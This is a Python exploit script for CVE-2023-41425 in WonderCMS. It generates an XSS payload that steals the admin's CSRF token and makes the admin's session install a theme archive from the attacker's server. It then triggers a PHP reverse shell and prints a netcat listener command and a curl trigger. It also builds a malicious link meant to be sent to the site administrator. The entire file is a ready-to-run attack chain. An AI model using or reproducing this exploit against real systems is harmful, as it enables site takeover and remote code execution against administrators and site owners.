import os,sys,re

##
## https://github.com/prodigiousMind/CVE-2023-41425/blob/main/exploit.py
## https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
##

def validate_input():
    """Validate that the correct number of arguments is provided."""
    if len(sys.argv) < 4:
        print("Usage: python3 exploit.py loginURL IP_Address ShellPort")
        print("Example: python3 exploit.py http://localhost/wondercms/loginURL 82.82.82.82 6699")
        sys.exit(1)

def prepare_urls():
    """Prepare the login URL, base URL, and path for the shell."""
    login_url = sys.argv[1]
    ip_address = sys.argv[2]
    shell_port = sys.argv[3]

    if login_url.endswith("/"):
        login_url = login_url.rstrip("/")

    url_without_login = "/".join(login_url.split("/")[:-1])
    shell_path = "/themes/revshell-main/rev.php"

    return login_url, url_without_login, shell_path, ip_address, shell_port

def create_token_script(url_without_login, ip_address, webserver_port, shell_path, shell_port):
    """Create the JavaScript payload for XSS attack."""
    token_script = '''
    var url = "{}";
    var token = document.querySelectorAll('[name="token"]')[0].value;
    var install_module_url = url + "/?installModule=http://{}:{}/shell.zip&directoryName=violet&type=themes&token=" + token;

    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.open("GET", install_module_url);
    xhr.send();
    xhr.onload = function() {{
        if (xhr.status == 200) {{
            var shell_url = url + "{}?lhost={}&lport={}";
            var xhr2 = new XMLHttpRequest();
            xhr2.withCredentials = true;
            xhr2.open("GET", shell_url);
            xhr2.send();
        }}
    }};
    '''.format(url_without_login, ip_address, webserver_port, shell_path, ip_address, shell_port)
    
    return token_script

def save_xss_script(token_script, ip_address, webserver_port, shell_port):
    """Save the XSS payload to a file and generate the attack link."""
    xss_filename = "xss.js"
    with open(xss_filename, "w") as f:
        f.write(token_script)
    
    print(f"[+] {xss_filename} is created")
    print(f"[+] Execute the below command in another terminal to listen for the reverse shell:\n")
    print(f"----------------------------")
    print(f"nc -lvp {shell_port}")
    print(f"----------------------------\n")

    xss_link = sys.argv[1].replace("loginURL", "index.php?page=loginURL?") + \
               "\"></form><script src=\"http://{}:{}/{}\"></script><form action=\"".format(ip_address, webserver_port, xss_filename)
    xss_link = xss_link.strip()

    print(f"Send the below link to the admin:\n")
    print(f"----------------------------")
    print(xss_link)
    print(f"----------------------------\n")

def start_http_server(webserver_port):
    """Start an HTTP server to serve the XSS script."""
    print("[+] Starting HTTP server to serve xss.js...")
    os.system(f"python3 -m http.server {webserver_port}")

def print_curl_command(url_without_login, shell_path, ip_address, shell_port):
    """Print the curl command to manually trigger the reverse shell."""
    curl_command = f"curl 'http://{url_without_login}{shell_path}?lhost={ip_address}&lport={shell_port}'"
    print(f"\nYou can also use the following curl command to trigger the reverse shell:\n")
    print(f"----------------------------")
    print(curl_command)
    print(f"----------------------------")

if __name__ == "__main__":
    validate_input()
    login_url, url_without_login, shell_path, ip_address, shell_port = prepare_urls()
    token_script = create_token_script(url_without_login, ip_address, "8000", shell_path, shell_port)
    save_xss_script(token_script, ip_address, "8000", shell_port)
    start_http_server("8000")
    print_curl_command(url_without_login, shell_path, ip_address, shell_port)

##
##
